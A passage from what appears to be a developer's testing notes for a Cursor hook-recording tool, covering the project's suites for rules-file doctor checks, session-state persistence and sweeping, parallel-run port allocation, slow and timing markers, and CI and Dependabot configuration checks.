  For a readable version off the list the `events` and `hooks-log` texts are pinned to those of
  d49c9d1. The five rejecting texts, and a rejection of Cursor's own
  shape naming all 21 valid events, fail with e6e6894's text, written out from its own output.
  The `rules` line warns on a missing rules file and on an
  unedited older default (`init -g` refreshes it), fails on a file the recorder would refuse (a
  link, not the owner's, writable by others, invalid, an R1 below the minimum) or a recorder that
  rejected the file (the default is in force), asks for a restart after a fix, and never fails
  because the recorder is down. An edited file that started from an older default is ok. The
  `lock` line takes a rules file the user reads through its group (V5d; a test injects the
  reader), and fails a group-writable one or one the user cannot read.
- Session state (`tests/test_session_state.py`, `tests/test_session_kill.py`, F11): a mark, a trigger,
  an inherited window, a parent link, a parent changed by propagation and every `links.json` change
  are on disk when `SessionStore.commit` returns (a store read right after, with no flush, is a killed
  recorder); a plain action writes nothing until the writer (`SAVE_DELAY_S`, 10 s) or `flush()`, and a
  clean store writes nothing. One writer: a commit waits for a write already in flight and writes
  itself if that write failed (`_strict_seq` / `_saved_seq`; the in-flight write is held open by the
  test, and a thread flushes in a loop while strict changes are made); a failed save of a mark or a
  link is an error once (a 500, so the client's offline guard applies) and later actions that change
  nothing are answered from memory. `private_dir` re-chmods the folder on every save, so a test makes
  `sessions.json` a folder to make a write fail. With 5000 chats a hook that changes nothing is within
  5 ms of the 10-chat median (interleaved in one `@wallclock` test) and writes nothing. The counter
  is raised at start to history's `MAX(ord) + 1` (`localstore.next_orders`, also for a log a killed
  writer left) and `put` never lowers it or the activity time. Child recorders: after SIGKILL every
  chat is judged as before (mark, trigger, Task, link, window, parent), SIGKILL and SIGTERM never
  reuse a saved order number, and a clean stop leaves `next_step` in the file. D29 (`sweep`): idle 29
  days goes, 28 stays; a marked chat, a trigger, an open window and a parent of a kept chat stay with
  their calls; marked or triggered through a parent counts (a subagent marked only through its
  parent survives, and so does its call after 2,500 other Tasks and a restart); a dropped chat's
  counter becomes a floor, so one that returns after an hourly sweep never reuses an order number; swept at start (before the counters are raised from history, so a swept chat keeps its
  floor) and by the hourly job; a sweep or a counter read that fails only logs and never stops the
  recorder or the job; a clean stop does not wait for ever for a stuck write; a pre-F11 or
  hackathon file loads with every mark and the first sweep drops nothing. CR1: a chat holding only a
  non-R1 trigger that is marked after its `Task` hands R1 to a subagent reached only through the
  workspace fallback, also after a restart; one that arrived earlier is not marked; the record made
  at the `Task` stays a floor. An unmarked chat with no trigger at its `Task` still hands on nothing
  (`test_a_task_started_by_an_unmarked_chat_gives_no_workspace_mark`).
- Parallel run (`tests/test_parallel.py`, F7): under `-n auto --dist loadgroup` every test has
  its own `HOME`, temporary folders and ports. `free_port` picks a random free port from
  20000-32767, below where the system hands out port 0 (macOS 49152-65535), whose remainder by
  the worker count is the worker's own number (`PYTEST_XDIST_WORKER[_COUNT]`); `StubRecorder`
  lets the system pick its port. So no other worker's `free_port` and no port-0 bind can take a
  port between its check and the moment a subprocess binds it, and a worker does not repeat a
  port within 64 calls (a crashed worker's replacement, gw8 of 8, can share a class with a live
  worker; a stranger process can still win the race).
  The package tests (one wheel build, files planted in the install and put back) carry
  `xdist_group(name="package")`. A test that asserts a time limit or leans on a sleep carries
  `@wallclock` (`tests/helpers.py`), put there by hand. The check sees only this: a test whose
  own body names `perf_counter` or `monotonic` and lacks the mark fails, and so does a module
  that names either and never uses `@wallclock`. `time.time`, `sleep`, a `join` timeout and a
  helper that times for the test are not scanned. Each group runs on one worker, in file order.
  `strict_markers` makes an unknown marker an error, serial or parallel.
- Quick check (`scripts/check.sh`, F17): `quick` runs `ruff check`, `ruff format --check`,
  pyright and the parallel pytest line with `-m "not slow"`; `full` runs the AGENTS.md Check line.
  Each command is its own line (no pipe, no `&&` list), so under `set -e` the first one that fails
  ends the script with its exit code. Anything but one `quick` or `full` prints a usage line and
  exits 2 with nothing run. `tests/test_ci_workflow.py` reads the script's two `case` arms: `full`
  must equal the AGENTS.md Check bullet word for word, and `quick` must equal `full` plus
  ` -m "not slow"` (pytest 9.1 does not refuse a mistyped `-m` expression, it runs everything).
  The Check bullet's third command must be `env PYRIGHT_PYTHON_IGNORE_WARNINGS=1 uv run pyright`,
  before pytest (F8): a place that drops it fails its match to the bullet, and this catches all of
  them dropping it at once. `[tool.pyright]` sets only the mode (basic), Python 3.12 and the
  excludes: `ui`, `.venv`, every hidden folder and each other `.gitignore` line that can hold a
  `.py` file (pyright does not read `.gitignore`; a new line there fails until it is mapped). It
  also runs the script with a stub `uv` first on `PATH` (a `/bin/sh`
  file that logs its words and fails on a chosen call): both modes make four calls, once each, in
  order; a failure on call 1, 2, 3 or 4 fails the script and stops it; bad arguments run nothing
  (these runs are `slow`: on a Mac the first run of a new executable file, the stub, takes
  seconds). CI runs the AGENTS.md line itself.
- `slow` (registered in `pyproject.toml`): a test that takes 2 s or more in a parallel
  `--durations=0` run carries `pytest.mark.slow`. `quick` leaves it out; `full` and CI run it.
  The installer, service, doctor and root-command modules carry it whole (`pytestmark`): most of
  their tests run real processes and many are quicker, but `quick` is meant to be short, so the
  mark errs on that side. `test_package.py` carries it for its `package` group; other tests carry
  it one by one. A new test that takes 2 s or more gets the mark. See what is left: `uv run pytest
  -q -n auto --dist loadgroup -m "not slow" --durations=10`.
- Timing rule (F17): no test compares an elapsed time with a fixed number of seconds. What stays
  is the client's 0.5 s wait (`CLIENT_WAIT`), the `hooks.json` 1 s timeout
  (`test_offline_guard.py`), and waits that end at a deadline (poll loops, and a `join` with a
  limit as a hang guard). A test counts work (`test_normalize.py` counts `_Scanner` starts
  against the scan limit), or compares a time with a baseline measured in the same test (best of
  several, taken in turns so that a busy machine slows both), or sets a wait the code enforces
  (`WIPE_BUDGET_S`, `STOP_WAIT_S`, `WRITE_TIMEOUT_S`) and compares with that wait plus a baseline.
  Scaling tests compare 4 times the input with the shorter one (linear: about 4, quadratic: about
  16). `normalize` and the rulefile matcher cache their results: time `normalize.__wrapped__`, and
  give the matcher a command no earlier round matched, or the repeat times a lookup. A regression
  that would wait for ever is run on a thread the test gives up on (`join` with a limit), so it
  fails the test instead of hanging it.
- CI (`tests/test_ci_workflow.py`, F7): `ci.yml` is read with a small YAML-subset parser that
  refuses syntax it does not know. The suite fails if the file gains a trigger beyond main pushes
  and pull requests, a write permission, a `uses:` not pinned to a 40-character SHA or not one
  of the three approved actions, a `with:` input beyond the list for that action (no token, no
  cache, checkout keeps no credentials), a `secrets` word, a runner other than `macos-15`, or a
  `run:` of more than one line (one command per step: `bash -e` carries on past a failed `a`
  in `a && b`); or if it loses the cancel of an older pull-request run, `uv sync --locked` or
  one of the three check commands in AGENTS.md "Commands" (read from that file, run in this
  order). Its mutation cases look the action pins up in `ci.yml` instead of hard-coding them
  (F9).
- Dependabot (`tests/test_dependabot_config.py`, F9): `dependabot.yml` is read with the same
  parser. The suite fails if it gains a second entry or an ecosystem other than `github-actions`
  (`pip`, `uv`, `npm`), a key the test does not list (`target-branch`, `ignore`, `labels`,
  `open-pull-requests-limit`, `registries`), a schedule other than weekly, a directory other than
  `/`, or if it loses or renames its one group (`github-actions`, pattern `"*"`, quoted: the parser
  refuses a bare `*`) or loses its 7-day cooldown. It also fails if `.github/workflows/` holds
  anything but `ci.yml` (Finder's `.DS_Store` aside) or if a `dependabot.yaml` sits beside the
  `.yml`. A copy of `ci.yml` with every pin swapped for another SHA and tag, what a Dependabot PR
  does, still passes the CI check.
